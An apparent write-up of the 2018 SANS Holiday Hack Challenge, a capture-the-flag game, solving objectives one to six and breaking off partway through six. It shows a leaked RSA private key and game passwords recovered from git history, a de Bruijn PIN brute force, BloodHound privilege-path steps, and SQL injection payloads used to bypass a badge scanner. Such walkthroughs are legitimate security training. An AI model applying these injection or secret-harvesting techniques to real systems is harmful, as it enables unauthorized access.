            <a class="dropdown-item" href="#npcBushy">Bushy Evergreen</a>
            <a class="dropdown-item" href="#termViescape">Essential Editor Skills</a>
          </div>
        </div>
        <div>
          <p>What phrase is revealed when you answer all of the <a href="https://www.holidayhackchallenge.com/2018/challenges/osint_challenge_windows.html" target="_blank">KringleCon Holiday Hack History questions</a>? <i>For hints on achieving this objective, please visit <a href="#npcBushy">Bushy Evergreen</a> and help him with the <a href="#termViescape"><b>Essential Editor Skills</b></a> Cranberry Pi terminal challenge.</i></p>
        </div>
        <hr class="my-4">
        <p>This challenge is pretty straightforward. Find out some history about previous Holiday Hack Challenges. For a clue on where to begin you need to speak with <a href="#npcBushy">Bushy Evergreen</a> and work on <a href="#termViescape"><b>Essential Editor Skills</b></a> Cranberry Pi terminal challenge.</i></p>
        <p>Bushy's clue says to listen to Ed Skoudis' talk to get our answers for the orientation challenge.</p>
        <table class="table">
          <thead>
            <th>Question</th>
            <th>Video Reference</th>
            <th>Answer</th>
          </thead>
          <tbody>
            <td>In 2015, the Dosis siblings asked for help understanding what piece of their "Gnome in Your Home" toy?</td>
            <td><a href="https://youtu.be/31JsKzsbFUo?t=216">3 minutes 36 seconds</a></td>
            <td nowrap>Firmware</td>
          </tbody>
          <tbody>
            <td>In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which corporation?</td>
            <td><a href="https://youtu.be/31JsKzsbFUo?t=294">4 minutes 54 seconds</a></td>
            <td nowrap>ATNAS</td>
          </tbody>
          <tbody>
            <td>In 2016, participants were sent off on a problem-solving quest based on what artifact that Santa left?</td>
            <td><a href="https://youtu.be/31JsKzsbFUo?t=373">6 minutes 13 seconds</a></td>
            <td nowrap>Business Card</td>
          </tbody>
          <tbody>
            <td>In 2016, Linux terminals at the North Pole could be accessed with what kind of computer?</td>
            <td>
              <p><a href="https://youtu.be/31JsKzsbFUo?t=559">16 minutes 40 seconds</a></p>
              <p><i>Note that the video does not mention the term "Cranberry Pi" until 16 minutes and 40 seconds in. There no actual portion of the video that directly associates the term "Cranberry Pi" and the 2016 Dosis challenge.</i></p>
            </td>
            <td nowrap>Cranberry Pi</td>
          </tbody>
          <tbody>
            <td>In 2017, the North Pole was being bombarded by giant objects. What were they?</td>
            <td><a href="https://youtu.be/31JsKzsbFUo?t=559">9 minutes 19 seconds</a></td>
            <td nowrap>Snowballs</td>
          </tbody>
          <tbody>
            <td>In 2017, Sam the snowman needed help reassembling pages torn from what?</td>
            <td><a href="https://youtu.be/31JsKzsbFUo?t=579">9 minutes 39 seconds</a></td>
            <td nowrap>The Great Book</td>
          </tbody>
        </table>
        <p>Once you entered all the correct answers you are provided the final answer:</p>
        <p><button type="button" class="btn btn-success">Happy Trails</button></p>
      </div>

      <div class="border p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="obj2"></a>Objective2
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#hntMinty">Minty Candycane Hints</a>
            <a class="dropdown-item" href="#npcMinty">Minty Candycane</a>
            <a class="dropdown-item" href="#termPwshmenu">The Name Game</a>
            <a class="dropdown-item" href="#artMenuPS1">menu.ps1 from The Name Game terminal</a>
          </div>
        </div>
        <p>Who submitted (First Last) the rejected talk titled <b>Data Loss for Rainbow Teams: A Path in the Darkness</b>? <a href="https://cfp.kringlecastle.com/">Please analyze the CFP site to find out</a>. <i>For hints on achieving this objective, please visit <a href="#npcMinty">Minty Candycane</a> and help her with the <a href="#termPwshmenu"><b>The Name Game</b></a> Cranberry Pi terminal challenge.</i></p>
        <hr class="my-4">
        <p>Looking at the source code for the root page of <a href="https://cfp.kringlecastle.com/">https://cfp.kringlecastle.com/</a> shows that there are some references to a page in a <code>/cfp</code> directory. As a matter of fact both the "CFP" link at the top and the 'Apply Now' button in the middle of the page both redirect to <a href="https://cfp.kringlecastle.com/cfp/cfp.html">/cfp/cfp.html</a>. Let's see what happens if we take away the 'cfp.html' portion. Perhaps there's an index.html or hopefully a directory listing of some type.</p>
        <p><a href="https://cfp.kringlecastle.com/cfp/">https://cfp.kringlecastle.com/cfp/</a> gives us a directory listing. One of the files is <a href="https://cfp.kringlecastle.com/cfp/rejected-talks.csv">rejected-talks.csv</a></p>
        <p>We can either download the document or just open it in browser and search for the term <b>Data Loss for Rainbow Teams: A Path in the Darkness</b>. That gives us the following line:</p>
        <pre class="border text-light bg-dark p-2" style="white-space: pre-wrap">
qmt3,2,8040424,200,FALSE,FALSE,John,McClane,Director of Security,Data Loss for Rainbow Teams: A Path in the Darkness,1,11</pre>
        <p>From this we can see the answer:</p>
        <button class="btn btn-success">John McClane</button>
      </div>

      <div class="border p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="obj3"></a>Objective 3
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#hntTangle">Tangle Coalbox Hints</a>
            <a class="dropdown-item" href="#npcTangle">Tangle Coalbox</a>
            <a class="dropdown-item" href="#termViminfo">Lethal ForensicELFication</a>
          </div>
        </div>
        <p>The KringleCon Speaker Unpreparedness room is a place for frantic speakers to furiously complete their presentations. The room is protected by a <a href="https://doorpasscoden.kringlecastle.com/">door passcode</a>. Upon entering the correct passcode, what message is presented to the speaker? <i>For hints on achieving this objective, please visit <a href="#npcTangle">Tangle Coalbox</a> and help him with the <a href="#termViminfo"><b>Lethal ForensicELFication</b></a> Cranberry Pi terminal challenge.</i></p>
        <hr class="my-4">
        <img src="images/door_passcode.png">
        <p>The lock, as depicted above, consists of 4 glyphs: <img src="images/dc-triangle.png">, <img src="images/dc-square.png">, <img src="images/dc-circle.png">, and <img src="images/dc-star.png">. We are tasked with finding out what the door code is. Our hint is to use a de Bruijn Sequence. We are even given a link to a <a href="http://www.hakank.org/comb/debruijn.cgi">de Bruijn Sequence Generator</a>. <a href="#npcTangle">Tangle</a> informs us that the alphabet is 4 characters (the 4 glyphs), and the length of the PIN is also 4.</p>
        <p>In order for a de Bruijn Sequence to work efficiently, the lock must only compare the correct PIN to the <i>last 4 characters pressed</i>, not individual batches of 4 characters. With that in mind let's generate a de Bruihn Sequence for a PIN with an alphabet of 4 and a length of 4.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">0 0 0 0 1 0 0 0 2 0 0 0 3 0 0 1 1 0 0 1 2 0 0 1 3 0 0 2 1 0 0 2 2 0 0 2 3 0 0 3 1 0 0 3 2 0 0 3 3 0 1 0 1 0 2 0 1 0 3 0 1 1 1 0 1 1 2 0 1 1 3 0 1 2 1 0 1 2 2 0 1 2 3 0 1 3 1 0 1 3 2 0 1 3 3 0 2 0 2 0 3 0 2 1 1 0 2 1 2 0 2 1 3 0 2 2 1 0 2 2 2 0 2 2 3 0 2 3 1 0 2 3 2 0 2 3 3 0 3 0 3 1 1 0 3 1 2 0 3 1 3 0 3 2 1 0 3 2 2 0 3 2 3 0 3 3 1 0 3 3 2 0 3 3 3 1 1 1 1 2 1 1 1 3 1 1 2 2 1 1 2 3 1 1 3 2 1 1 3 3 1 2 1 2 1 3 1 2 2 2 1 2 2 3 1 2 3 2 1 2 3 3 1 3 1 3 2 2 1 3 2 3 1 3 3 2 1 3 3 3 2 2 2 2 3 2 2 3 3 2 3 2 3 3 3 3 (0 0 0)</pre>
        <p>If we substitute the decimal representation with the glyph position where 0 = <img src="images/dc-triangle.png">, 1 = <img src="images/dc-square.png">, 2 = <img src="images/dc-circle.png">, and 3 = <img src="images/dc-star.png"> we get the following sequence:</p>
        <p><img src="images/dc-triangle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-square.png"> <img src="images/dc-triangle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-circle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-star.png"> <img src="images/dc-triangle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-square.png"> <img src="images/dc-square.png"> <img src="images/dc-triangle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-square.png"> <img src="images/dc-circle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-square.png"> <img src="images/dc-star.png"> <img src="images/dc-triangle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-circle.png"> <img src="images/dc-square.png"> <img src="images/dc-triangle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-circle.png"> <img src="images/dc-circle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-circle.png"> <img src="images/dc-star.png"> <img src="images/dc-triangle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-star.png"> <img src="images/dc-square.png"> <img src="images/dc-triangle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-star.png"> <img src="images/dc-circle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-star.png"> <img src="images/dc-star.png"> <img src="images/dc-triangle.png"> <img src="images/dc-square.png"> <img src="images/dc-triangle.png"> <img src="images/dc-square.png"> <img src="images/dc-triangle.png"> <img src="images/dc-circle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-square.png"> <img src="images/dc-triangle.png"> <img src="images/dc-star.png"> <img src="images/dc-triangle.png"> <img src="images/dc-square.png"> <img src="images/dc-square.png"> <img src="images/dc-square.png"> <img src="images/dc-triangle.png"> <img src="images/dc-square.png"> <img src="images/dc-square.png"> <img src="images/dc-circle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-square.png"> <img src="images/dc-square.png"> <img src="images/dc-star.png"> <img src="images/dc-triangle.png"> <img src="images/dc-square.png"> <img src="images/dc-circle.png"> <img src="images/dc-square.png"> <img src="images/dc-triangle.png"> <img src="images/dc-square.png"> <img src="images/dc-circle.png"> <img src="images/dc-circle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-square.png"> <img src="images/dc-circle.png"> <img src="images/dc-star.png"> <img src="images/dc-triangle.png"> <img src="images/dc-square.png"> <img src="images/dc-star.png"> <img src="images/dc-square.png"> <img src="images/dc-triangle.png"> <img src="images/dc-square.png"> <img src="images/dc-star.png"> <img src="images/dc-circle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-square.png"> <img src="images/dc-star.png"> <img src="images/dc-star.png"> <img src="images/dc-triangle.png"> <img src="images/dc-circle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-circle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-star.png"> <img src="images/dc-triangle.png"> <img src="images/dc-circle.png"> <img src="images/dc-square.png"> <img src="images/dc-square.png"> <img src="images/dc-triangle.png"> <img src="images/dc-circle.png"> <img src="images/dc-square.png"> <img src="images/dc-circle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-circle.png"> <img src="images/dc-square.png"> <img src="images/dc-star.png"> <img src="images/dc-triangle.png"> <img src="images/dc-circle.png"> <img src="images/dc-circle.png"> <img src="images/dc-square.png"> <img src="images/dc-triangle.png"> <img src="images/dc-circle.png"> <img src="images/dc-circle.png"> <img src="images/dc-circle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-circle.png"> <img src="images/dc-circle.png"> <img src="images/dc-star.png"> <img src="images/dc-triangle.png"> <img src="images/dc-circle.png"> <img src="images/dc-star.png"> <img src="images/dc-square.png"> <img src="images/dc-triangle.png"> <img src="images/dc-circle.png"> <img src="images/dc-star.png"> <img src="images/dc-circle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-circle.png"> <img src="images/dc-star.png"> <img src="images/dc-star.png"> <img src="images/dc-triangle.png"> <img src="images/dc-star.png"> <img src="images/dc-triangle.png"> <img src="images/dc-star.png"> <img src="images/dc-square.png"> <img src="images/dc-square.png"> <img src="images/dc-triangle.png"> <img src="images/dc-star.png"> <img src="images/dc-square.png"> <img src="images/dc-circle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-star.png"> <img src="images/dc-square.png"> <img src="images/dc-star.png"> <img src="images/dc-triangle.png"> <img src="images/dc-star.png"> <img src="images/dc-circle.png"> <img src="images/dc-square.png"> <img src="images/dc-triangle.png"> <img src="images/dc-star.png"> <img src="images/dc-circle.png"> <img src="images/dc-circle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-star.png"> <img src="images/dc-circle.png"> <img src="images/dc-star.png"> <img src="images/dc-triangle.png"> <img src="images/dc-star.png"> <img src="images/dc-star.png"> <img src="images/dc-square.png"> <img src="images/dc-triangle.png"> <img src="images/dc-star.png"> <img src="images/dc-star.png"> <img src="images/dc-circle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-star.png"> <img src="images/dc-star.png"> <img src="images/dc-star.png"> <img src="images/dc-square.png"> <img src="images/dc-square.png"> <img src="images/dc-square.png"> <img src="images/dc-square.png"> <img src="images/dc-circle.png"> <img src="images/dc-square.png"> <img src="images/dc-square.png"> <img src="images/dc-square.png"> <img src="images/dc-star.png"> <img src="images/dc-square.png"> <img src="images/dc-square.png"> <img src="images/dc-circle.png"> <img src="images/dc-circle.png"> <img src="images/dc-square.png"> <img src="images/dc-square.png"> <img src="images/dc-circle.png"> <img src="images/dc-star.png"> <img src="images/dc-square.png"> <img src="images/dc-square.png"> <img src="images/dc-star.png"> <img src="images/dc-circle.png"> <img src="images/dc-square.png"> <img src="images/dc-square.png"> <img src="images/dc-star.png"> <img src="images/dc-star.png"> <img src="images/dc-square.png"> <img src="images/dc-circle.png"> <img src="images/dc-square.png"> <img src="images/dc-circle.png"> <img src="images/dc-square.png"> <img src="images/dc-star.png"> <img src="images/dc-square.png"> <img src="images/dc-circle.png"> <img src="images/dc-circle.png"> <img src="images/dc-circle.png"> <img src="images/dc-square.png"> <img src="images/dc-circle.png"> <img src="images/dc-circle.png"> <img src="images/dc-star.png"> <img src="images/dc-square.png"> <img src="images/dc-circle.png"> <img src="images/dc-star.png"> <img src="images/dc-circle.png"> <img src="images/dc-square.png"> <img src="images/dc-circle.png"> <img src="images/dc-star.png"> <img src="images/dc-star.png"> <img src="images/dc-square.png"> <img src="images/dc-star.png"> <img src="images/dc-square.png"> <img src="images/dc-star.png"> <img src="images/dc-circle.png"> <img src="images/dc-circle.png"> <img src="images/dc-square.png"> <img src="images/dc-star.png"> <img src="images/dc-circle.png"> <img src="images/dc-star.png"> <img src="images/dc-square.png"> <img src="images/dc-star.png"> <img src="images/dc-star.png"> <img src="images/dc-circle.png"> <img src="images/dc-square.png"> <img src="images/dc-star.png"> <img src="images/dc-star.png"> <img src="images/dc-star.png"> <img src="images/dc-circle.png"> <img src="images/dc-circle.png"> <img src="images/dc-circle.png"> <img src="images/dc-circle.png"> <img src="images/dc-star.png"> <img src="images/dc-circle.png"> <img src="images/dc-circle.png"> <img src="images/dc-star.png"> <img src="images/dc-star.png"> <img src="images/dc-circle.png"> <img src="images/dc-star.png"> <img src="images/dc-circle.png"> <img src="images/dc-star.png"> <img src="images/dc-star.png"> <img src="images/dc-star.png"> <img src="images/dc-star.png"> (<img src="images/dc-triangle.png"> <img src="images/dc-triangle.png"> <img src="images/dc-triangle.png">)</p>
        <p>As we walk through the sequence on the <a href="https://doorpasscoden.kringlecastle.com/" target="_blank">door</a> we arrive at the solution to open the door:</p>
        <p><img src="images/dc-triangle.png"><img src="images/dc-square.png"><img src="images/dc-circle.png"><img src="images/dc-triangle.png"></p>
        <p>When you walk into the Speaker Unpreparedness Room you are greeted by Morcel Nougat who gives you the phrase:</p>
        <button class="btn btn-success">Welcome unprepared speaker!</button>
      </div>

      <div class="border p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="obj4"></a>Objective 4
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#hntWunorse">Wunorse Openslae Hints</a>
            <a class="dropdown-item" href="#npcWunorse">Wunorse Openslae</a>
            <a class="dropdown-item" href="#termPlaintextCreds">Stall Mucking Report</a>
          </div>
        </div>

        <p>Retrieve the encrypted ZIP file from the <a href="https://git.kringlecastle.com/Upatree/santas_castle_automation">North Pole Git repository</a>. What is the password to open this file? <i>For hints on achieving this objective, please visit <a href="#npcWunorse">Wunorse Openslae</a> and help him with <a href="#termPlaintextCreds"><b>Stall Mucking Report</b></a> Cranberry Pi terminal challenge.</i></p>
        <hr class="my-4">
        <p><a href="https://git.kringlecastle.com/Upatree/santas_castle_automation">Is a git repository for Santa's drone fleet. There is only one .zip file in the repository, <a href="https://git.kringlecastle.com/Upatree/santas_castle_automation/blob/master/schematics/ventilation_diagram.zip">ventilation_diagram.zip</a>. If we want to open it we need to figure out what the password it. Perhaps the password is in the repo somehow. <a href="hntWunorse">Wunorse</a> gives us two hints to help. A link to <a href="https://youtu.be/myKrWVaq3Cw?t=185">Brian Hostetler's talk</a>, and a link to the <a href="https://github.com/dxa4481/truffleHog">Trufflehog tool</a>.</p>
        <p>It looks like we can install trufflehog locally. Let's do so in an isolated python environment.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
<span style="color: rgb(64, 255, 64); font-weight: bold;">elf@776172646f67</span><span style="color: rgb(255, 255, 255); font-weight: bold;">$</span> virtualenv trufflehog
Running virtualenv with interpreter /usr/bin/python2
New python executable in /mnt/d/git/trufflehog/bin/python2
Also creating executable in /mnt/d/git/trufflehog/bin/python
Installing setuptools, pkg_resources, pip, wheel...done.
elf@776172646f67$ source trufflehog/bin/activate
<span style="color: rgb(255, 255, 255); font-weight: bold;">(trufflehog)</span> <span style="color: rgb(64, 255, 64); font-weight: bold;">elf@776172646f67</span><span style="color: rgb(255, 255, 255); font-weight: bold;">$</span> pip install trufflehog
Collecting trufflehog
  Using cached https://files.pythonhosted.org/packages/6a/30/efbdeb399c543b052c31c05fa7dab78cd6d02d26934c087b83adb1b83c93/truffleHog-2.0.98-py2.py3-none-any.whl
Collecting GitPython==2.1.1 (from trufflehog)
  Using cached https://files.pythonhosted.org/packages/0b/4b/b50901e779e9b651f2f60cdcdfc62620d73cc0140eef441052d7ab1b540f/GitPython-2.1.1-py2.py3-none-any.whl
Collecting truffleHogRegexes==0.0.7 (from trufflehog)
  Using cached https://files.pythonhosted.org/packages/7d/e3/5f800360d7f0b68f935fcd06ec18ec28802b931aa4bf6caef20de00b6546/truffleHogRegexes-0.0.7-py2.py3-none-any.whl
Collecting gitdb2>=2.0.0 (from GitPython==2.1.1->trufflehog)
  Using cached https://files.pythonhosted.org/packages/da/30/a407568aa8d8f25db817cf50121a958722f3fc5f87e3a6fba1f40c0633e3/gitdb2-2.0.5-py2.py3-none-any.whl
Collecting smmap2>=2.0.0 (from gitdb2>=2.0.0->GitPython==2.1.1->trufflehog)
  Using cached https://files.pythonhosted.org/packages/55/d2/866d45e3a121ee15a1dc013824d58072fd5c7799c9c34d01378eb262ca8f/smmap2-2.0.5-py2.py3-none-any.whl
Installing collected packages: smmap2, gitdb2, GitPython, truffleHogRegexes, trufflehog
Successfully installed GitPython-2.1.1 gitdb2-2.0.5 smmap2-2.0.5 truffleHogRegexes-0.0.7 trufflehog-2.0.98</pre>
        <p>Now we can run trufflehog on the repository.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
<span style="color: rgb(255, 255, 255); font-weight: bold;">(trufflehog)</span> <span style="color: rgb(64, 255, 64); font-weight: bold;">elf@776172646f67</span><span style="color: rgb(255, 255, 255); font-weight: bold;">$</span> trufflehog --regex https://git.kringlecastle.com/Upatree/santas_castle_automation.git</pre>
        <p>The output spans multiple pages but a few items of interest are</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
<span style="color: rgb(32, 196, 32);">Reason: High Entropy
Date: 2018-12-11 01:25:21
Hash: c376f995b44caf502992ddb617a34e7d38d7bbc1
Filepath: schematics/files/dot/ssh/key.rsa
Branch: origin/master
Commit: support files for Santa's drone functions</span>

@@ -1,27 +0,0 @@
------BEGIN RSA PRIVATE KEY-----
<span style="color: rgb(192, 128, 64);">-MIIEowIBAAKCAQEAsvB0ov2pCU0zr9olk0P2CZw9ZDgQVcsM9t37tK+ddah7pe3z
-11wLQG9EWSCLKfFdQgaMlo+x6wRSjpzODqIAjLfvDwr3TFlCv93oYoTzwmwdHIWB
-60FxGSryDK+CPRuCcrYfQDrbpAyB/i8JrNNQHwrJsh0aF66irexFAKNIwH4a3Bzv
-tX+5Oh7zR5zwBXFT08ijP2wEfz6DPkoK0P0zHm+vmGajZ3lOZQ6wufbRBaAJYp5Y
-XnAIMwYGI1y6hiIGTSPpa4LT6j325z6jGfUqCLox2uFPByPo+HGKMvFd+MV/OE+G
-4iM6lp1HZmcZcd3ZPxEqw1VrBp/CRv0U676K9QIDAQABAoIBAF56fWsNubGSlKbV
-7J8L9B1w5C1FOMLDui2iWWM2klHsSpT6xZPBIqO72/+fIjtcGFxjLtnUNyGan6hy
-/I1XVij2eP+dT6N9QbQii69w+W9/PAOyLj2zyO578V9nT8HKA59jr65vJUdB32UB
-Gv+odxZc0M/9c6hrabOhG3HRxPj0+k29qPm4+U4bFoufaNT1a1p4Zq1ZQy0KAWuE
-WsoeXVBu5e+J2lGcTEWSNScGKkjkHtHIvQmtPOeoa6dyDjANN8nOIrCnHwY5GxKk
-eeGpffyQ3EnM7uGW09IHN6Kt3M7RVGzQPAzTt7L+Ez+dW27+nnKcSxiW6N15jW7s
-w+QmFCUCgYEA23OeCUa58xnYs/RVpfqBkRlMs/9nKJ2+55fWa1eTOl4sXTDOe3EV
-ptR48se1ynVSww3zFl8ksh1GCD3ecPawHG3WAb4MU66UDtLYYPcr5IrX6tZfsiPi
-MaXmiUjcXSZZc/+smz6Bg1C5lGA3/+mI/Rgern2LF2mEZYolOMdDyp8CgYEA0L2V
-K7qVEkSNYjelgmZF3bP/ahHJvk7ZlsVbCVTnFj3j6XU7Fng86x5lxEUiO2a2q/Id
-B1daYUHL5Kef0ZcdKTNirOwxkwHUu4l27DCgIBBVGyJMFtX4wIMW9xrp9PUl78mi
-5FJolyq9XhDELjkD1OKp6UdSXISurQqn8XFLlesCgYEArTjXDzVvxC+ruWhtTuWs
-7m7M9+vrbskNjttwmix3f4Qkeq7y3ceGsrhWfDUeDyCK4oKZVhhl695lkE3dzsc6
-fkZIvflY25kbL5RIzklssSrTgoAS65edjVkJ32XO5AxIYeL4SVaOfqvywOcubOfX
-hQhL96oLZ8CXjFr+RJIttbsCgYAc9kDtOU0XpMVNHFVte000TpYgnGk2a3BLOATC
-jbImZt3pdWeGXZZuNOB/0+vE/CJaRxR6AUe7+MoWZp+JEANuxP9q6LaUJAvlHVSP
-vstox3tXcXHHNVb3NvkHvgc6Ao2J8JsWPMzgNIDjvUXK+AQtFGnowQmPZqVpwvG8
-UTDgkwKBgEZ/OIhjkXHltomC8HMjFxSZ7/YF94aTEdgo3GNb44VlLgz4SJD4ztcz
-d2M+rIaGtrXPylHdoHrGHyDMhc8Lnh8fNNKbMFLL8Zd8sKRt92bDHR9/JO+k/PKr
-ZWwI1hlAs8o9z81481/mKgA417dFRDTT1LgRdaKiiL/H/trWepgl</span>
------END RSA PRIVATE KEY-----</pre>

        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
<span style="color: rgb(32, 196, 32);">Reason: High Entropy
Date: 2018-12-11 01:25:21
Hash: c376f995b44caf502992ddb617a34e7d38d7bbc1
Filepath: support_files/spec/support/Mstrctr.js
Branch: origin/master
Commit: support files for Santa's drone functions</span>

@@ -1,5 +0,0 @@
-
-module.export.addNote = function () {
-      console.log('Secret Key');
-      return '<span style="color: rgb(192, 128, 64);">wPu4Ry8FBhckXWjCfjx5QlkRR8vcAqLBf6sgmrcjwFv0c1xjMUw1Qh+rWVQZTTRP</span>';
- };</pre>

        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
<span style="color: rgb(32, 196, 32);">Reason: High Entropy
Date: 2018-12-11 01:16:57
Hash: 0dfdc124b43a4e7e1233599c429c0328ec8b01ef
Filepath: schematics/for_elf_eyes_only.md
Branch: origin/master
Commit: important update</span>

@@ -1,15 +0,0 @@
-Our Lead InfoSec Engineer Bushy Evergreen has been noticing an increase of brute force attacks in our logs. Furthermore, Albaster discovered and published a vulnerability with our password length at the last Hacker Conference.
-
-Bushy directed our elves to change the password used to lock down our sensitive files to something stronger. Good thing he caught it before those dastardly villians did!
-
-
-Hopefully this is the last time we have to change our password again until next Christmas.
-
-
-
-
-Password = 'Yippee-ki-yay'
-
-
-Change ID = '<span style="color: rgb(192, 128, 64);">9ed54617547cfca783e0f81f8dc5c927e3d1e3</span>'
-</pre>
        <p>The last message, seen multiple times in the repo, indicates a password that we can use to open the zip file:</p>
        <button class="btn btn-success">Yippee-ki-yay</button>
      </div>

      <div class="border p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="obj5"></a>Objective 5
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#hntHolly">Holly Evergreen Hints</a>
            <a class="dropdown-item" href="#npcHolly">Holly Evergreen</a>
            <a class="dropdown-item" href="#termHTTP2">CURLing Master</a>
          </div>
        </div>
        <p>Using the data set contained in this <a href="#obj5">SANS Slingshot Linux image</a>, find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name (in username@domain.tld format)? Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws. <i>For hints on achieving this objective, please visit <a href="#npcHolly">Holly Evergreen</a> and help her with the <a href="#termHTTP2"><b>CURLing Master</b></a> Cranberry Pi terminal challenge.</i></p>
        <hr class="my-4">
        <p>This challenge has us getting familiar with Bloodhound using the SANS Slingshot Linux image. I had to make a few tweaks to the VM settings to get it to run, like extra video memory, etc.. I then recorded the session so you can see the steps taken below.</p>
        <ul>
          <li>First we open the Slingshot image and load bloodhound. This loads the Active Directory data for analysis.</li>
          <li>Click on the <b>Filter</b> button to bring up the Edge Filtering menu. Uncheck "CanRDP"</li>
          <li>Click on the hamburger icon in the upper left select "Queries"</li>
          <li>Scroll down to <b>Shortest Paths to Domain Admins from Kerberoastable Users</b></li>
          <li>A dialog box will open to let you select a Domain Admin group. Select the only option <b>DOMAIN ADMINS@AD.KRINGLECASTLE.COM</b></li>
          <li>Now we can can see the path to the Domain Admin group from the user <b>LDUBEJ00320@AD.KRINGLECASTLE.</b></li>
        </ul>
        <video width="1024" height="768" controls>
          <source src="video/slingshot.webm" type="video/webm">
        </video>
        <button class="btn btn-success">LDUBEJ00320@AD.KRINGLECASTLE.COM</button>
      </div>

      <div class="border p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="obj6"></a>Objective 6
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#hntPepper">Pepper Minstix Hints</a>
            <a class="dropdown-item" href="#npcPepper">Pepper Minstix</a>
            <a class="dropdown-item" href="#termSprayDetect">Yule Log Analysis</a>
            <a class="dropdown-item" href="#obj6">Scan-O-Matic</a>
          </div>
        </div>
        <p>Bypass the authentication mechanism associated with the room near Pepper Minstix. <a href="https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg">A sample employee badge is available</a>. What is the access control number revealed by the <a href="https://scanomatic.kringlecastle.com/index.html">door authentication panel</a>? <i>For hints on achieving this objective, please visit <a href="#npcPepper">Pepper Minstix</a> and help her with the <a href="#termSprayDetect"><b>Yule Log Analysis</b></a> Cranberry Pi terminal challenge.</i></p>
        <hr class="my-4">
        <p>For this challenge we need to create our own badge to use on the Scan-O-Matic. We are provided a single sample badge which you can see below.</p>
        <img src="https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg">
        <p>The QR code on Alabaster's sample badge translates to <b>oRfjg5uGHmbduj2m</b>
        <p>Using the <a href="https://www.the-qrcode-generator.com/">QR Generator provided as a hint from <a href="#hnt">Pepper Minstix</a> we can see what happens when we use different values as input for the QR code to the Scan-O-Matic.</p>
        <ul>
          <li>Using <a href="images/alabaster.png">Alabaster's code</a> we get the message "Authorized user account has been disabled!"</li>
          <li>Trying '<a href="images/shinny.png">shinny</a>' gives us a standard error of 'No authorized user accounts found!'</li>
          <li>Another clue suggests SQL injection so let's try <a href="images/quote.png">a single quote</a> which gives us this error:</li>
          <ul>
            <li>EXCEPTION AT LINE 96 "user_info = query("SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1".format(uid))"): (1064, u"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''' LIMIT 1' at line 1")</li>
          </ul>
          <li>Based on this we can see that our QR code value is placed into the bracket of the SQL query. Looking at the query line we want an account that's authorized and has a matching <b>uid</b>. Let's skip the <b>uid</b> and select the first authorized account. We want the line to say <b>AND uid = '' OR 1 -- -</b> which makes our input <a href="images/or_one.png"><b>' OR 1 -- -</b></a>.</li>
          <ul>
            <li><b>Authorized user account has been disabled!</b></li>
          </ul>
          <li>The keyword from the previous attempt is <b>disabled</b>. The query also has an enabled field. Let's set that to 1. That makes our input <a href="images/enabled.png"><b>' OR enabled = 1 -- -</b></a></li>
          <li>This works and we can now access the room and are given a message from the Scan-O-Matic.</li>
        </ul>
